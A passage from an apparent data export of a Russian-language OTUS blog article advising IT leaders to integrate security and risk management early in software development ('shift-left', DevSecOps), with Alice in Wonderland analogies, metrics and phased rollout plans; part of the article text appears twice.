обнаружение — Сокращение ручного труда — Стабильное качество Предпроизводственное тестирование — Динамическое тестирование безопасности приложений — Пенетрационное тестирование — Комплаенс‑проверка — Регрессионное тестирование безопасности — Проверка средств контроля — Комплексная оценка — Готовность к проверкам — Снижение рисков 4. Безопасность на производстве  Начало диалога: «Как нам обеспечить безопасность, когда системы находятся в активном использовании?» Подобно постоянному мониторингу безопасности в городе и службам экстренной помощи, производственная безопасность гарантирует, что системы остаются защищенными от возникающих угроз. ОБЛАСТЬ ДЕЯТЕЛЬНОСТИ КЛЮЧЕВЫЕ ВИДЫ ДЕЯТЕЛЬНОСТИВЛИЯНИЕ НА БИЗНЕСНепрерывный мониторинг — Мониторинг событий безопасности — Интеграция анализа угроз — Обнаружение аномалий — Управление уязвимостями — Быстрое обнаружение угроз — Проактивная защита — Предотвращение взломов — Управление рисками Реагирование на инциденты — Автоматизация процессов реагирования — Разработка сценариев — Межкомандная координация — Процедуры восстановления— Минимизация воздействия — Непрерывность бизнеса — Соблюдение нормативных требований — Доверие клиентовНепрерывное совершенствование — Анализ первопричин — Анализ эффективности контроля— Совершенствование процессов — Обмен знаниями — Совершенствование защиты — Зрелость процессов — Сокращение повторяемости — Организационное обучение V. Измерение успеха: Метрики безопасности Чтобы эффективно контролировать процессы, связанные с безопасностью, необходима комплексная панель мониторинга, которая будет отслеживать ключевые метрики на протяжении всего жизненного цикла поставки программного обеспечения.Опережающие индикаторы (профилактические)  проектов, которые завершили разработку моделей угроз до начала разработки  разработчиков, прошедших обучение по вопросам безопасности Результаты сканирования кода, количество выявленных уязвимостей на 1000 строк кодаУчет требований безопасности в пользовательских историях Показатели проверки безопасности архитектуры Оценки рисков сторонних компонентов Операционные индикаторы (в процессе) Среднее время, необходимое для исправления результатов проверки безопасности Коэффициент сокращения технического долга безопасности Скорость прохождения автоматизированных тестов безопасности Охват сканирования уязвимостей Показатели прохождения/неудачи контроля безопасности Соответствие стандарту написания безопасного кода Запаздывающие индикаторы (результаты) Инциденты производственной безопасности в разбивке по степени серьезности Результаты проверки безопасности, полученные после релизаСтатус соответствия требованиям аудитаПроцент приложений с актуальными пенетрационными тестами Средний возраст уязвимости в разбивке по степени серьезностиЗадержки релиза, связанные с безопасностью VI. Практическое руководство по внедрению: С головой в кроличью нору  Этап 1: Закладываем фундамент (1-3 месяца) Подобно Алисе, которая пыталась понять правила Страны чудес, начните с определения основных показателей безопасности:Оценка зрелости системы безопасности в командах разработчиков Отображение рисков текущего состояния и анализ пробелов Определение модели управления безопасностью Создание первоначальное системы показателей Определение пилотной группы и определение приоритетов Реализация быстрой победы Этап 2: Запуск трансформации (3-6 месяцев)Подобно путешествию Алисы в Страну чудес, начните свою трансформационную экспедицию с нескольких ключевых шагов:Внедрение программы, направленной на повышение осведомленности разработчиков о безопасности.Автоматизированная интеграция инструментов безопасности в процессы CI/CD.Создание программы ответственных по вопросам безопасности среди сотрудников Разработка рекомендаций по написанию безопасного кода Внедрение процесса моделирования угроз Сбор начальных показателей и настройка базового уровня безопасностиЭтап 3: Масштабирование и оптимизация (6-12 месяцев)По мере продвижения вперед расширяйте список успешных практик:Привлечение дополнительных групп разработчиков к работе над проектамиРеализация инициатив по улучшению, основанных на анализе показателейПовышение уровня автоматизации процессов безопасностиУглубление возможностей моделирования угрозПрограмма сертификации разработчиков Непрерывный цикл обратной связи и оптимизации VII. Новый образ мышления: Из Красной Королевы в Чеширского КотаМышление подразделений безопасности должно измениться от авторитарной Красной Королевы, которая требует повиновения через страх и угрожает рубить головы тех, кто не соответствует, к мышлению Чеширского Кота, который дает рекомендации, появляется при необходимости и помогает командам ориентироваться в сложном ландшафте безопасности, уважая их автономию. Трансформация руководства в сфере безопасности АСПЕКТ ТРАДИЦИОННОЕ МЫШЛЕНИЕ («КРАСНАЯ КОРОЛЕВА») СОВРЕМЕННОЕ МЫШЛЕНИЕ («ЧЕШИРСКИЙ КОТ») ВЛИЯНИЕ НА БИЗНЕС Стиль руководства — Командование и контроль — Комплаенс, основанный на страхе — Бинарный успех/неудача — Централизованная власть — Руководство и рекомендации — Решения, основанные на риске — Контекстуальное руководство — Распределенная ответственность — Более быстрая разработка— Улучшенное сотрудничество — Лучшие результаты в области безопасности — Снижение трений Принятие решений — Жесткие стандарты — Личное утверждения — Поэтапный процесс — Предотвращение рисков — Гибкие рекомендации — Автоматизированные проверки — Непрерывная оценка — Управление рисками — Ускоренная разработка— Соответствующие средства контроля — Последовательная защита — Поддержка бизнеса Взаимодействие в команде — Безопасность диктует требования — Проверки по факту — Дистанционные отношения — Ориентация на одобрение — Коллаборативная архитектура— Встроенный опыт в области безопасности — Модель партнерства — Ориентация на поддержку — Общая ответственность — Более раннее обнаружение — Сокращение переделок — Расширение возможностей команды Ключевые изменения в мышлении на практике 1. От исполнителя к инициатору  ТРАДИЦИОННАЯ ПРАКТИКА СОВРЕМЕННАЯ ПРАКТИКА ИЗВЛЕКАЕМАЯ ВЫГОДАЗащитные шлагбаумы Защитные ограждения Снижение трудностей при разработкеРучные проверки безопасности Самодостаточные инструменты безопасности Более быстрые циклы разработки Комплаенс, основанный на аудите Защита, основанная на рисках Соответствующие инвестиции в безопасность Авторизация безопасности Автоматические проверки Непрерывный комплаенс 2. От документации к автоматизации ТРАДИЦИОННАЯ ПРАКТИКА СОВРЕМЕННАЯ ПРАКТИКА ИЗВЛЕКАЕМАЯ ВЫГОДА Ручное подтверждение соответствия Автоматизированный сбор доказательств Сокращение накладных расходов на аудит Статические требования безопасности Безопасность как код Последовательная реализация Периодическое тестирование безопасности Непрерывная проверка безопасности Более раннее обнаружение уязвимостей Средства контроля, зависящие от человекаСредства контроля с машинным внедрением Масштабируемая безопасность 3. От безопасности проекта к безопасности продукта ТРАДИЦИОННАЯ ПРАКТИКА СОВРЕМЕННАЯ ПРАКТИКА ИЗВЛЕКАЕМАЯ ВЫГОДА Проверки в определенный момент времени Непрерывный мониторинг безопасности Устойчивая безопасность Передача ответственности операциямСовместной ответственности за безопасность Улучшенная операционная безопасность Пенетрационные тесты в конце Частое тестирование безопасности, Раннее обнаружение уязвимостей Накопление технического долга по безопасности Постоянное улучшение безопасности Сокращение инцидентовVIII. Смещение влево на практике: Золотой путь Основываясь на концепции «золотого пути» разработки программного обеспечения, мы можем создать «безопасный золотой путь», который интегрирует безопасность на каждом этапе жизненного цикла поставки программного обеспечения.До разработкиВиды деятельности:Проверка классификации информацииОценка рисков третьей стороной Обзор безопасности архитектуры Дизайн аутентификации и авторизации Моделирование угроз Кто: Управление информационными рисками, архитектура, продуктовые командыКак: Локальное управление с опытом в области безопасностиЦель: Минимизировать отставание в разработке с учетом требований безопасностиВ процессе разработкиВиды деятельности:Методы написания безопасного кода Проверки безопасности перед коммитамиСтатическое тестирование безопасности приложений Анализ композиции программного обеспечения Тайное сканированиеКод‑ревью ориентированные на безопасность Кто: Разработчики, ответственные за безопасность, appsec‑инженерыКак: Автоматизированный инструментарий в конвейере CI/CDЦель: Обнаруживать и устранять уязвимости на ранних стадиях разработки Перед релизомВиды деятельности:Динамическое тестирование безопасности приложений Пенетрационное тестированиеПроверка безопасности инфраструктурыКомплаенс‑проверка Финальный обзор системы безопасности Кто: Безопасность приложений, контроль качества, devopsКак: Автоматизированные системы безопасности с четкими путями исправленияЦель: Проверка средств контроля безопасности перед внедрением в производство В производстве Виды деятельности:Мониторинг безопасности и оповещение Управление уязвимостями Готовность к реагированию на инциденты Отслеживание показателей безопасности Постоянное совершенствование Кто: Операции, операции по обеспечению безопасности, продуктовые командыКак: Модель совместной ответственности с четкой подотчетностьюЦель: Поддерживать безопасность на протяжении всего жизненного цикла продуктаIX. Интегрированное будущее: Зрелость DevSecOps По мере развития вашей организации безопасность становится неотъемлемой частью процесса разработки, что в итоге приводит к созданию целостного DevSecOps‑подхода, который охватывает все аспекты работы.Характеристики зрелости DevSecOps ПЛОСКОСТЬ НАЧАЛЬНЫЙ УРОВЕНЬСРЕДНИЙ УРОВЕНЬ ПРОДВИНУТЫЙ УРОВЕНЬ Культура— Безопасность как отдельная функция — Акцент на комплаенс — Реактивный подход — Программа ответственных за безопасность — Межкомандное сотрудничество — Проактивное мышление — Совместная ответственность — Обеспечение безопасности — Стимулирование инноваций Автоматизация — Базовые инструменты сканирования — Ручные процедуры утверждения — Ограниченная интеграция — Интегрированные инструменты безопасности — Автоматические системы безопасности — Опции самообслуживания — Комплексная автоматизация — Политика как код — Превентивный контроль Измерение — Подсчет уязвимостей — Аудиты — Ручная отчетность — Отслеживание задолженности по безопасности — Метрики процессов — Автоматизированные панели мониторинга — Метрики, основанные на оценке рисков — Меры воздействия на бизнес — Предиктивная аналитика Управление — Традиционные политики безопасности — Ручная комплаенс‑проверка — Централизованный контроль — Современные стандарты безопасности — Автоматический комплаенс — Федеративное управление — Адаптивные политики — Непрерывный комплаенс — Распределенное владение Передовые методы интеграции безопасности По мере вашего роста и развития, рекомендую обратить внимание на следующие передовые методы интеграции безопасности:Безопасность инфраструктуры как кода (IaC):a) Политики безопасности, закодированные в виде определений инфраструктуры b) Автоматическая комплаенс‑проверка для облачных ресурсов c) Проверка безопасности перед развертываниемБезопасность как код a) Требования безопасности, определенные в машиночитаемых форматах b) Автоматизированное тестирование средств контроля безопасности c) Конфигурация безопасности с контролем версийПостоянный комплаенс‑контроль a) Комплаенс‑дашборд в режиме реального времени b) Автоматизированный сбор доказательств c) Проверка непрерывности контроляСамоорганизующиеся системы безопасности a)Порталы безопасности, ориентированные на разработчиков b) Инструменты тестирования безопасности по запросу c)Автоматическое руководство по обеспечению безопасностиX. Вывод: Ориентируйтесь в ландшафте рисков Переход от реактивной безопасности к управлению рисками по методологии «Shift‑Left» — это не просто смена методологии, а глубочайшее переосмысление того, как мы создаем и поддерживаем бизнес‑ценности безопасности с помощью технологий. Как в процветающих городах безопасность учитывается на всех этапах городского планирования, строительства и текущей эксплуатации, так и наш подход к разработке должен перейти от тестирования безопасности на поздних стадиях к комплексному управлению рисками, что позволит нам непрерывно внедрять инновации.Видение преобразованного предприятия Безопасность, которая ускоряет, а не ограничивает инновацииАвтоматизированный контроль, обеспечивающий соответствие требованиям без ручного вмешательства Прозрачные показатели безопасности, на основе которых принимаются решения, также основанные на оценке рисковВовлеченные команды, разделяющие ответственность за безопасность Архитектура, предназначенная для защиты, но при этом сохраняющая гибкостьНадежная основа безопасности, обеспечивающая постоянное соблюдение всех требованийВ процессе работы сотрудники подразделения безопасности перестают быть просто блюстителями закона, подобно Красной Королеве, и начинают играть роль, больше напоминающую услужливого, но ненавязчивого Чеширского Кота. Они развивают сотрудничество, учитывают контекст и постоянно совершенствуются, создавая не только безопасные технологические решения, но и устойчивую цифровую экосистему, способную адаптироваться к угрозам завтрашнего дня.Основные рекомендации для технологических лидеров Начните с понимания склонности бизнеса к риску, а не только с технического контроляПриведите показатели безопасности в соответствие с бизнес‑результатами, чтобы получать значимую информацию Обеспечьте наличие платформ и шаблонов безопасности, которые упростят процесс безопасной разработкиИзмерьте, что действительно важно, связав метрики безопасности с их влиянием на бизнесИнвестируйте в безопасность и формируйте культуру, которая охватывает всю организациюСоздавайте условия для безопасного развития, используя автоматические комплаенс и верификациюРегулярно делитесь информацией и масштабируйте успешные подходы к обеспечению безопасностиПомните, что процесс преобразования не происходит в одночасье, подобно тому, как великие города строятся не за один день. Важно начать действовать уже сейчас, двигаться к намеченной цели и сохранять фокус на достижении желаемых бизнес‑результатов, одновременно обеспечивая надежную защиту. Следуя этому подходу, вы создадите не только безопасный технологический ландшафт, но и процветающую экосистему, которая обеспечит успех вашей организации в будущем — безопасно и с уверенностью.Призыв к действию: начинаем трансформацию Оцените текущую степень зрелости вашей интеграции в систему безопасностиОпределите наиболее актуальные возможности для улучшения безопасностиСоздайте альянс лидеров бизнеса, технологий и безопасностиОпределите область с высокой отдачей для первоочередного вниманияУстановите четкие показатели, чтобы измерить прогресс в области безопасности.Активно делитесь успехами и новыми знаниямиРаспространяйте проверенные шаблоны в масштабах всей организации Не забывайте о постоянной работе над улучшением безопасности Организации, которые успешно проведут эту трансформацию, получат значительные конкурентные преимущества. Они смогут быстрее и безопаснее поставлять программное обеспечение, более эффективно использовать инвестиции в безопасность, лучше соответствовать нормативным требованиям, создавать условия для безопасных инноваций и достичь большей согласованности между различными аспектами безопасности в рамках бизнеса.Начинать нужно сейчас. Будущее состояние безопасности вашей организации зависит от фундамента, который вы закладываете сегодня. Станьте главным связующим звеном между бизнесом и разработкой, и узнайте, почему оценки проектов часто ошибочны и как учитывать человеческий фактор для более реалистичного планирования. Записывайтесь на открытый урок:14 апреля. Почему ваши оценки проекта всегда ошибочныБольше открытых уроков по разработке и управлению — в календаре мероприятий."
7,"Безопасность мертва, да здравствует риск-менеджмент",OTUS,Цифровые навыки от ведущих экспертов,0,"Консалтинг и поддержка, Рекрутинг и HR, Производство мультимедиа-контента",2025-04-10,"Руководство по переосмыслению риск-менеджмента в современной разработке программного обеспечения для IT-директоров.Шон Маккарти — вице‑президент и главный архитектор отдела глобальной архитектуры, рисков и управления в Manulife.Традиционные подходы к обеспечению безопасности все больше теряют свою актуальность для современных технологических лидеров, которым нужно ориентироваться в сложном и постоянно меняющемся ландшафте угроз. Управление информационными рисками больше не может быть одним из обязательных мероприятий под конец разработки, оно должно быть интегрировано на протяжении всего жизненного цикла программного обеспечения. По мере того как регулирующие органы предъявляют все более строгие требования к обеспечению безопасности и соответствию стандартам, организации вынуждены кардинально пересмотреть свой подход к риск‑менеджменту. Вместо того чтобы реагировать на угрозы, они должны действовать на опережение, обеспечивая безопасность на всех этапах.«Сегодня регулирующие органы уже не довольствуются только фреймворками, документацией и проверкой достоверности аудита. Они требуют реальных доказательств, включая комплексное тестирование и управление программами комплаенса, которые должны быть интегрированы в повседневные операционные процессы.» — 2025 Banking Regulatory Outlook, Deloitte И эта тенденция очевидна. В современной цифровой экономике бизнес‑цели, такие как «стать надежным финансовым партнером» или «защита данных клиентов при внедрении инноваций», требуют не только технического контроля и документации. Необходимо переосмыслить подход к интеграции безопасности и комплаенсу на каждом этапе создания программного обеспечения. Основные тезисы: Традиционные подходы к обеспечению безопасности, которые сосредоточены на проверке безопасности на поздних стадиях разработки, уже не отвечают современным требованиям бизнеса и регулирующих органовУспешная трансформация требует перехода от образа мышления «охранника» к образу мышления «доверенного советника»Успех зависит от соблюдения четырех ключевых принципов: совместной работы, автоматизации, наглядности и предотвращенияИзмерение состояния безопасности с помощью четко определенных показателей позволяет управлять рисками на основе данныхКультурная трансформация и развитие потенциала столь же важны, как и технический контрольОжидаемые преимущества:Сокращение задержек при поставке программного обеспечения, связанных с безопасностьюСнижение числа уязвимостей и инцидентов после релизаСнижение затрат на устранение последствий за счет раннего выявления проблемПовышение соответствия нормативным требованиям и готовности к аудитуБолее тесное сотрудничество между командами безопасности и разработчиковБолее надежная система безопасности с минимальными трудностями при поставкеI. Современные задачи безопасности: Риски в Стране чудес В знаменитой книге Льюиса Кэрролла «Алиса в Стране чудес» есть сцена, где Красная Королева произносит фразу: «Сначала казнь! Потом приговор!». Этот абсурдный подход к правосудию напоминает то, как многие современные организации решают проблемы безопасности: они вводят меры контроля только после завершения разработки, когда внесение изменений становится особенно дорогим и разрушительным. Такой подход порождает конфликты, в которых отдел безопасности воспринимается как источник проблем, а не как жизненно важный партнер, способствующий созданию безопасного программного обеспечения.Традиционный подход не оправдывает ожиданийПредставьте себе город, в котором проверки зданий проводятся только после завершения строительства. Застройщики могут понести огромные расходы, если структурные проблемы будут обнаружены слишком поздно. В таком случае им придется тратить значительные средства на дорогостоящие исправления или даже полную реконструкцию. К сожалению, многие организации до сих пор придерживаются такого же подхода к обеспечению информационной безопасности. Они ждут, пока разработка почти завершится, прежде чем проводить проверки безопасности, пенетрационные тесты и нормоконтроль.Цена обеспечения безопасности на поздних стадияхОрганизации, которые придерживаются традиционных подходов к безопасности, сталкиваются с рядом проблем: Дорогостоящая доработка и задержка релизаВраждебные отношения между подразделениями безопасности и разработки Растущий долг безопасности Повышенная уязвимость к угрозам Растущие операционные риски Проблемы с соблюдением требований и контроль со стороны регулирующих органов II. Эволюция риск-менеджментаВ рамках современной информационной безопасности важно мыслить как доверенный советник, а не как строгий контролер. Это означает создание условий для безопасной разработки, одновременно поддерживая целостность системы и соответствие нормативным требованиям.От охранника до градостроителя:ТРАДИЦИОННЫЙ ПОДХОД СОВРЕМЕННЫЙ ПОДХОД Анализ безопасности на завершающем этапе разработкиБезопасность в требованиях Ручной нормоконтрольАвтоматическое применение политик Безопасность как средство блокировки Безопасность как средство обеспечения Безопасность в масштабах проекта Безопасность в масштабах продукта Защита периметра Принципы нулевого доверия Теперь представьте себе мир, в котором разработчики имеют доступ к предварительно утвержденным шаблонам безопасности, автоматическим комплаенс‑проверкам и четким рекомендациями по безопасности, которые позволяют надежно и быстро создавать приложения, обеспечивая при этом защиту. В этом заключается суть современной интеграции безопасности: предоставление более высокого уровня строительных блоков безопасности, которые способствуют внедрению инноваций и быстрой реорганизации бизнеса, сохраняя при этом целостность системы. Вместо того чтобы требовать от каждой команды быть экспертами по безопасности, мы разрабатываем платформы и шаблоны, которые упрощают процесс, обеспечивая при этом высокое качество и согласованность.III. “Что”: Стратегический подход к безопасности  В условиях, когда важно находить баланс между гибкостью бизнеса, соблюдением нормативных требований и обеспечением безопасности, ключом к успеху становится совершенствование вашего подхода к безопасности. Средства безопасности должны способствовать быстрому созданию ценности для бизнеса, одновременно обеспечивая надежную защиту от угроз.Крайне важно, чтобы подразделения безопасности были сосредоточены на поддержке бизнеса, а не только на защите. Это подразумевает активное понимание как бизнес‑целей, так и планируемых путей реализации, а затем плавную интеграцию системы безопасности в эти процессы.Переход к «Shift‑Left» системам безопасности представляет собой значительный культурный сдвиг. Безопасность больше не воспринимается как нечто, что появляется только на финише разработки, а становится неотъемлемой частью всего процесса. Преобразование требований безопасности в практические рекомендации и инструменты контроля позволяет командам, занимающимся разработкой, создавать безопасные системы с самого начала.Основные области, требующие внимания:Соответствие между возможностями обеспечения безопасности и готовностью бизнеса к рискуПереход от контрольных точек к системному обеспечению безопасностиФреймворки для измерения эффективности безопасности Требования к культурной трансформации Модели эффективного межкомандного сотрудничестваМетоды определения приоритетов инвестиций в безопасностьАвтоматизированный комплаенс‑мониторингСтратегии обеспечения безопасности инновацийТочно так же, как безопасность города зависит от применения строительных норм на начальных этапах планирования, наша стратегия безопасности должна быть интегрирована на протяжении всего жизненного цикла проекта. Такая интеграция позволит добиться серьезных бизнес‑ценностей: сокращения количества инцидентов, повышения готовности к соблюдению нормативных требований и укрепления доверия клиентов.IV. “Как”: Создание безопасных цифровых продуктов 1. Безопасность в анализе требованийНачало диалога: «Как нам сделать так, чтобы безопасность учитывалась с самого начала?»Подобно тому, как мы изучаем строительные нормы перед составлением архитектурных планов, требования безопасности должны быть установлены на ранних этапах процесса разработки.ОБЛАСТЬ ДЕЯТЕЛЬНОСТИ КЛЮЧЕВЫЕ ВИДЫ ДЕЯТЕЛЬНОСТИВЛИЯНИЕ НА БИЗНЕС Оценка рисков — Тщательная оценка средств контроля — Проверка подлинности и авторизации — Планирование защиты данных — Требования к проверке входных данных — Снижение затрат на исправление ошибок— Улучшение комплаенса— Повышение доверия клиентов Анализ проектных решений— Планирование сегментации сети — Анализ безопасности потоков данных — Архитектура безопасности приложений — Внедрение системы с нулевым уровнем доверия — Устойчивость системы — Углубленная защита — Сокращение пространства для атаки — Комплаенс заложен в архитектуруКлассификация данных— Стандарты классификации информации— Выбор соответствующих элементов управления — Сопоставление требований к конфиденциальности — Согласование с нормативными актами — Соблюдение нормативных требований — Предотвращение утечек данных — Соответствующие уровни защиты — Оптимизация ресурсов 2. Безопасность в анализе проектных решенийНачало диалога: «Как мы выявляем и устраняем риски безопасности в нашей архитектуре?»Подобно тому, как градостроители стремятся предотвратить преступления с помощью экологического дизайна, безопасность в проектировании сосредоточена на раннем выявлении и минимизации угроз.ОБЛАСТЬ ДЕЯТЕЛЬНОСТИ КЛЮЧЕВЫЕ ВИДЫ ДЕЯТЕЛЬНОСТИ ВЛИЯНИЕ НА БИЗНЕСМоделирование угроз — Систематическая идентификация рисков — Анализ векторов атак — Профили потенциальных злоумышленников — Оценка влияния на бизнес — Упреждающее снижение рисков — Целевые средства контроля безопасности — Обоснованные инвестиционные решения — Снижение уязвимостей Шаблоны защиты — Предварительно утвержденные шаблоны безопасности — Эталонные архитектуры безопасности — Рекомендации по внедрению — Примеры передовой практики— Ускорение разработки — Согласованная безопасность — Уменьшение конструктивных недостатков — Повторное использование знанийАнализ проектных решений — Оценка архитектуры безопасности — Оценка эффективности контроля — Валидация паттернов проектирования — Рекомендации экспертов — Повышение качества проектирования — Раннее обнаружение дефектов — Оптимизированные средства управления — Уменьшение технического долга 3. Безопасность при сборке и тестированииНачало диалога: «Как нам обеспечить безопасность кода до того, как он будет запущен в продакшене?» Подобно инспекциям зданий, проводимым на протяжении всего строительства, тестирование безопасности должно быть интегрировано в процесс разработки.ОБЛАСТЬ ДЕЯТЕЛЬНОСТИ КЛЮЧЕВЫЕ ВИДЫ ДЕЯТЕЛЬНОСТИ ВЛИЯНИЕ НА БИЗНЕСБезопасное программирование— Внедрение стандартов написания кода— Обучение разработчиков безопасности — Экспертные оценки кода — Фреймворки безопасности — Меньшее количество уязвимостей — Компетентность разработчиков — Стабильное качество — Сокращение инцидентов Автоматизированное тестирование — Статическое тестирование безопасности приложений — Анализ состава программного обеспечения — Скрытое сканирование — Сканирование безопасности контейнеров — Непрерывная проверка — Раннее обнаружение — Сокращение ручного труда — Стабильное качество Предпроизводственное тестирование — Динамическое тестирование безопасности приложений — Пенетрационное тестирование — Комплаенс‑проверка — Регрессионное тестирование безопасности — Проверка средств контроля — Комплексная оценка — Готовность к проверкам — Снижение рисков 4. Безопасность на производстве  Начало диалога: «Как нам обеспечить безопасность, когда системы находятся в активном использовании?» Подобно постоянному мониторингу безопасности в городе и службам экстренной помощи, производственная безопасность гарантирует, что системы остаются защищенными от возникающих угроз. ОБЛАСТЬ ДЕЯТЕЛЬНОСТИ КЛЮЧЕВЫЕ ВИДЫ ДЕЯТЕЛЬНОСТИВЛИЯНИЕ НА БИЗНЕСНепрерывный мониторинг — Мониторинг событий безопасности — Интеграция анализа угроз — Обнаружение аномалий — Управление уязвимостями — Быстрое обнаружение угроз — Проактивная защита — Предотвращение взломов — Управление рисками Реагирование на инциденты — Автоматизация процессов реагирования — Разработка сценариев — Межкомандная координация — Процедуры восстановления— Минимизация воздействия — Непрерывность бизнеса — Соблюдение нормативных требований — Доверие клиентовНепрерывное совершенствование — Анализ первопричин — Анализ эффективности контроля— Совершенствование процессов — Обмен знаниями — Совершенствование защиты — Зрелость процессов — Сокращение повторяемости — Организационное обучение V. Измерение успеха: Метрики безопасности Чтобы эффективно контролировать процессы, связанные с безопасностью, необходима комплексная панель мониторинга, которая будет отслеживать ключевые метрики на протяжении всего жизненного цикла поставки программного обеспечения.Опережающие индикаторы (профилактические)  проектов, которые завершили разработку моделей угроз до начала разработки  разработчиков, прошедших обучение по вопросам безопасности Результаты сканирования кода, количество выявленных уязвимостей на 1000 строк кодаУчет требований безопасности в пользовательских историях Показатели проверки безопасности архитектуры Оценки рисков сторонних компонентов Операционные индикаторы (в процессе) Среднее время, необходимое для исправления результатов проверки безопасности Коэффициент сокращения технического долга безопасности Скорость прохождения автоматизированных тестов безопасности Охват сканирования уязвимостей Показатели прохождения/неудачи контроля безопасности Соответствие стандарту написания безопасного кода Запаздывающие индикаторы (результаты) Инциденты производственной безопасности в разбивке по степени серьезности Результаты проверки безопасности, полученные после релизаСтатус соответствия требованиям аудитаПроцент приложений с актуальными пенетрационными тестами Средний возраст уязвимости в разбивке по степени серьезностиЗадержки релиза, связанные с безопасностью VI. Практическое руководство по внедрению: С головой в кроличью нору  Этап 1: Закладываем фундамент (1-3 месяца) Подобно Алисе, которая пыталась понять правила Страны чудес, начните с определения основных показателей безопасности:Оценка зрелости системы безопасности в командах разработчиков Отображение рисков текущего состояния и анализ пробелов Определение модели управления безопасностью Создание первоначальное системы показателей Определение пилотной группы и определение приоритетов Реализация быстрой победы Этап 2: Запуск трансформации (3-6 месяцев)Подобно путешествию Алисы в Страну чудес, начните свою трансформационную экспедицию с нескольких ключевых шагов:Внедрение программы, направленной на повышение осведомленности разработчиков о безопасности.Автоматизированная интеграция инструментов безопасности в процессы CI/CD.Создание программы ответственных по вопросам безопасности среди сотрудников Разработка рекомендаций по написанию безопасного кода Внедрение процесса моделирования угроз Сбор начальных показателей и настройка базового уровня безопасностиЭтап 3: Масштабирование и оптимизация (6-12 месяцев)По мере продвижения вперед расширяйте список успешных практик:Привлечение дополнительных групп разработчиков к работе над проектамиРеализация инициатив по улучшению, основанных на анализе показателейПовышение уровня автоматизации процессов безопасностиУглубление возможностей моделирования угрозПрограмма сертификации разработчиков Непрерывный цикл обратной связи и оптимизации VII. Новый образ мышления: Из Красной Королевы в Чеширского КотаМышление подразделений безопасности должно измениться от авторитарной Красной Королевы, которая требует повиновения через страх и угрожает рубить головы тех, кто не соответствует, к мышлению Чеширского Кота, который дает рекомендации, появляется при необходимости и помогает командам ориентироваться в сложном ландшафте безопасности, уважая их автономию. Трансформация руководства в сфере безопасности АСПЕКТ ТРАДИЦИОННОЕ МЫШЛЕНИЕ («КРАСНАЯ КОРОЛЕВА») СОВРЕМЕННОЕ МЫШЛЕНИЕ («ЧЕШИРСКИЙ КОТ») ВЛИЯНИЕ НА БИЗНЕС Стиль руководства — Командование и контроль — Комплаенс, основанный на страхе — Бинарный успех/неудача — Централизованная власть — Руководство и рекомендации — Решения, основанные на риске — Контекстуальное руководство — Распределенная ответственность — Более быстрая разработка— Улучшенное сотрудничество — Лучшие результаты в области безопасности — Снижение трений Принятие решений — Жесткие стандарты — Личное утверждения — Поэтапный процесс — Предотвращение рисков — Гибкие рекомендации — Автоматизированные проверки — Непрерывная оценка — Управление рисками — Ускоренная разработка— Соответствующие средства контроля — Последовательная защита — Поддержка бизнеса Взаимодействие в команде — Безопасность диктует требования — Проверки по факту — Дистанционные отношения — Ориентация на одобрение — Коллаборативная архитектура— Встроенный опыт в области безопасности — Модель партнерства — Ориентация на поддержку — Общая ответственность — Более раннее обнаружение — Сокращение переделок — Расширение возможностей команды Ключевые изменения в мышлении на практике 1. От исполнителя к инициатору  ТРАДИЦИОННАЯ ПРАКТИКА СОВРЕМЕННАЯ ПРАКТИКА ИЗВЛЕКАЕМАЯ ВЫГОДАЗащитные шлагбаумы Защитные ограждения Снижение трудностей при разработкеРучные проверки безопасности Самодостаточные инструменты безопасности Более быстрые циклы разработки Комплаенс, основанный на аудите Защита, основанная на рисках Соответствующие инвестиции в безопасность Авторизация безопасности Автоматические проверки Непрерывный комплаенс 2. От документации к автоматизации ТРАДИЦИОННАЯ ПРАКТИКА СОВРЕМЕННАЯ ПРАКТИКА ИЗВЛЕКАЕМАЯ ВЫГОДА Ручное подтверждение соответствия Автоматизированный сбор доказательств Сокращение накладных расходов на аудит Статические требования безопасности Безопасность как код Последовательная реализация Периодическое тестирование безопасности Непрерывная проверка безопасности Более раннее обнаружение уязвимостей Средства контроля, зависящие от человекаСредства контроля с машинным внедрением Масштабируемая безопасность 3. От безопасности проекта к безопасности продукта ТРАДИЦИОННАЯ ПРАКТИКА СОВРЕМЕННАЯ ПРАКТИКА ИЗВЛЕКАЕМАЯ ВЫГОДА Проверки в определенный момент времени Непрерывный мониторинг безопасности Устойчивая безопасность Передача ответственности операциямСовместной ответственности за безопасность Улучшенная операционная безопасность Пенетрационные тесты в конце Частое тестирование безопасности, Раннее обнаружение уязвимостей Накопление технического долга по безопасности Постоянное улучшение безопасности Сокращение инцидентовVIII. Смещение влево на практике: Золотой путь Основываясь на концепции «золотого пути» разработки программного обеспечения, мы можем создать «безопасный золотой путь», который интегрирует безопасность на каждом этапе жизненного цикла поставки программного обеспечения.До разработкиВиды деятельности:Проверка классификации информацииОценка рисков третьей стороной Обзор безопасности архитектуры Дизайн аутентификации и авторизации Моделирование угроз Кто: Управление информационными рисками, архитектура, продуктовые командыКак: Локальное управление с опытом в области безопасностиЦель: Минимизировать отставание в разработке с учетом требований безопасностиВ процессе разработкиВиды деятельности:Методы написания безопасного кода Проверки безопасности перед коммитамиСтатическое тестирование безопасности приложений Анализ композиции программного обеспечения Тайное сканированиеКод‑ревью ориентированные на безопасность Кто: Разработчики, ответственные за безопасность, appsec‑инженерыКак: Автоматизированный инструментарий в конвейере CI/CDЦель: Обнаруживать и устранять уязвимости на ранних стадиях разработки Перед релизомВиды деятельности:Динамическое тестирование безопасности приложений Пенетрационное тестированиеПроверка безопасности инфраструктурыКомплаенс‑проверка Финальный обзор системы безопасности Кто: Безопасность приложений, контроль качества, devopsКак: Автоматизированные системы безопасности с четкими путями исправленияЦель: Проверка средств контроля безопасности перед внедрением в производство В производстве Виды деятельности:Мониторинг безопасности и оповещение Управление уязвимостями Готовность к реагированию на инциденты Отслеживание показателей безопасности Постоянное совершенствование Кто: Операции, операции по обеспечению безопасности, продуктовые командыКак: Модель совместной ответственности с четкой подотчетностьюЦель: Поддерживать безопасность на протяжении всего жизненного цикла продуктаIX. Интегрированное будущее: Зрелость DevSecOps По мере развития вашей организации безопасность становится неотъемлемой частью процесса разработки, что в итоге приводит к созданию целостного DevSecOps‑подхода, который охватывает все аспекты работы.Характеристики зрелости DevSecOps ПЛОСКОСТЬ НАЧАЛЬНЫЙ УРОВЕНЬСРЕДНИЙ УРОВЕНЬ ПРОДВИНУТЫЙ УРОВЕНЬ Культура— Безопасность как отдельная функция — Акцент на комплаенс — Реактивный подход — Программа ответственных за безопасность — Межкомандное сотрудничество — Проактивное мышление — Совместная ответственность — Обеспечение безопасности — Стимулирование инноваций Автоматизация — Базовые 